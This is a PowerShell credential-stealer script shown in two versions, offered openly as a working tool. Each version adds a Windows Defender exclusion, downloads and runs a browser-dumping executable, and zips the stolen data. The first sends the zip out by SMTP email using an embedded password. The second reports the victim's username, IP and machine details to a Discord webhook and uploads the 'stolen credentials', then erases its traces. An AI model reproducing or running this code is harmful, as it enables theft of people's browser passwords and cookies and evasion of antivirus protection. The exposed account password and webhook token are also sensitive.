#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\Microsoft\dump"
Set-Location "$env:appdata\Microsoft\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest 'https://github.com/Real0xdom/venom/raw/master/hackbrowser.exe' -OutFile "hb.exe"
.\hb.exe --format json
Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random
#Mailing the output you will need to enable less secure app access on your google account for this to work
$Message = new-object Net.Mail.MailMessage
$smtp = new-object Net.Mail.SmtpClient("smtp.outlook.com", 587)
$smtp.Credentials = New-Object System.Net.NetworkCredential("zymalsakhi@outlook.com", "vbefieuamehjivpp
");
$smtp.EnableSsl = $true
$Message.From = "zymalsakhi@outlook.com"
$Message.To.Add("securebytepakistan@gmail.com")
$ip = Invoke-RestMethod "myexternalip.com/raw"
$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$Message.Body = $ComputerName
$files=Get-ChildItem
$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
$smtp.Send($Message)
$Message.Dispose()
$smtp.Dispose()
#Cleanup
cd "$env:appdata"
Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"
##########################################################################################################################





################################################################################################################################
# Adding Windows Defender exclusion path
Add-MpPreference -ExclusionPath "$env:appdata"

# Creating the directory we will work on
mkdir "$env:appdata\Microsoft\dump" -Force
Set-Location "$env:appdata\Microsoft\dump"

# Downloading and executing hackbrowser.exe
Invoke-WebRequest 'https://github.com/Real0xdom/venom/raw/master/hackbrowser.exe' -OutFile "hb.exe"
.\hb.exe --format json
Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force

# Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip

# Get victim information
$ip = (Invoke-RestMethod "http://ifconfig.me/ip").Trim()
$username = $env:USERNAME
$computerName = $env:COMPUTERNAME
$manufacturer = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer
$model = (Get-CimInstance -ClassName Win32_ComputerSystem).Model

# Discord Webhook URL (YOUR TEST WEBHOOK)
$webhookUrl = "https://discord.com/api/webhooks/1480287085771620606/WtlPfAW2q0H_-PmPD8AG6axb7k_iHbzmkg46kiomUxskavkfn7yCXoKaP_VtssBE0mJ9"

# Create Discord embed message
$payload = @{
    content = "🎯 **New Victim Compromised!**"
    embeds = @(
        @{
            title = "✅ Successfully PWNED: $username"
            color = 15158332  # Red
            fields = @(
                @{
                    name = "👤 Username"
                    value = $username
                    inline = $true
                }
                @{
                    name = "💻 Computer"
                    value = $computerName
                    inline = $true
                }
                @{
                    name = "🌐 IP Address"
                    value = $ip
                    inline = $false
                }
                @{
                    name = "🖥️ System Info"
                    value = "$manufacturer $model"
                    inline = $false
                }
            )
            timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
            footer = @{
                text = "Credential Stealer v2.0"
            }
        }
    )
} | ConvertTo-Json -Depth 4

# Send notification to Discord
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'

# Send the ZIP file with stolen credentials
$filePath = "$env:appdata\Microsoft\dump\dump.zip"
curl.exe -F "content=📦 Stolen credentials attached" -F "file=@$filePath" $webhookUrl

# Cleanup
cd "$env:appdata"
Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"
